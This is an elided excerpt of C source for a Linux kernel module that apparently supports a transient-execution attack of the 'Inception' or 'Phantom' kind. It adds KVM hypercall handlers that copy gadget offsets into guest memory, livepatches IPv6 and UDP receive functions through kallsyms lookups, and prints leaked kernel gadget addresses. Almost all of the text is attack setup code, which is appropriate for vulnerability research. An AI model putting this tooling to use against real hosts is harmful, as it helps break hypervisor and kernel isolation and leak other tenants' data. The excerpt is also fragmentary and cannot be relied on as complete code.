...
static int vmmcall_read_gadget_offsets(struct kvm_vcpu *vcpu,
                                       unsigned long a0) {
  int ret;
  struct x86_exception e;
  gpa_t gpa;
  ...
  gpa = kvm_mmu_gva_to_gpa_read(vcpu, a0, &e);
  ret =
      kvm_vcpu_write_guest(vcpu, gpa, &gadget_offsets, sizeof(gadget_offsets));
  if (ret < 0) {
...
static int vmmcall_trigger_inception_selftest(struct kvm_vcpu *vcpu,
                                              unsigned long a0) {
...
static uint64_t vmmcall_read_reload_buffer_addr(struct kvm_vcpu *vcpu,
                                                unsigned long a0) {
  int ret;
  struct x86_exception e;
  gpa_t gpa, gpa_buffer;
...
static void ioctl_exit(void) { proc_remove(procfs_file); }
...
/* LIVEPATCH */
extern void ip6_protocol_deliver_rcu_new(struct net *net, struct sk_buff *skb,
...
static int livepatch_init(void) {
  ip6_protocol_deliver_rcu_module_addr =
      (uint64_t)kallsyms_lookup_name_module("ip6_protocol_deliver_rcu");
  ip6_protocol_deliver_rcu_module_addr +=
      5; /* skip the fentry call (to break the recursion */

  udpv6_queue_rcv_one_skb_module_addr =
      (uint64_t)kallsyms_lookup_name_module("udpv6_queue_rcv_one_skb");
  udpv6_queue_rcv_one_skb_module_addr +=
      5; /* skip the fentry call (to break the recursion */

  lookup_address_in_pgd_module =
      (pte_t * (*)(pgd_t *, unsigned long, unsigned int *))
          kallsyms_lookup_name_module("lookup_address_in_pgd");
...
static void verbose_init(void) {
  printk(KERN_INFO "%llx, %llx, %llx, %llx, %llx, %llx\n",
         *(uint64_t *)gadget_leak_text, *(uint64_t *)gadget_leak_phys,
         *(uint64_t *)gadget_leak_phys2, *(uint64_t *)gadget_leak_physmap,
         *(uint64_t *)gadget_leak_data, *(uint64_t *)gadget_leak_data_selftest);
  ...
  printk(KERN_INFO "gadget_leak_text: %px\n",
         (void *)(((uint64_t)gadget_leak_text & ~0xfff) -
                  ((uint64_t)gadget_leak_text & ~0xfff)));
  printk(KERN_INFO "gadget_leak_phys: %px\n",
         (void *)(((uint64_t)gadget_leak_phys & ~0xfff) -
                  ((uint64_t)gadget_leak_text & ~0xfff)));
  printk(KERN_INFO "gadget_leak_phys2: %px\n",
         (void *)(((uint64_t)gadget_leak_phys2 & ~0xfff) -
                  ((uint64_t)gadget_leak_text & ~0xfff)));
  printk(KERN_INFO "gadget_leak_physmap: %px\n",
         (void *)(((uint64_t)gadget_leak_physmap & ~0xfff) -
                  ((uint64_t)gadget_leak_text & ~0xfff)));
  printk(KERN_INFO "gadget_leak_data: %px\n",
         (void *)(((uint64_t)gadget_leak_data & ~0xfff) -
                  ((uint64_t)gadget_leak_text & ~0xfff)));
  printk(KERN_INFO "gadget_leak_data_selftest: %px\n",
         (void *)(((uint64_t)gadget_leak_data_selftest & ~0xfff) -
                  ((uint64_t)gadget_leak_text & ~0xfff)));
  printk(KERN_INFO "phantom_jump1: %px\n",
         (void *)(((uint64_t)phantom_jump1 & ~0xfff) -
                  ((uint64_t)gadget_leak_text & ~0xfff)));
  printk(KERN_INFO "phantom_jump2: %px\n",
         (void *)(((uint64_t)phantom_jump2 & ~0xfff) -
                  ((uint64_t)gadget_leak_text & ~0xfff)));
}

static int __init my_init(void) {
  if (lookup_kallsyms_lookup_name() != 0) return -1;
  if (hypercall_kprobe_helper_init() != 0) return -1;
  ...
  if (livepatch_init() != 0) return -1;
  if (ioctl_init() != 0) return -1;
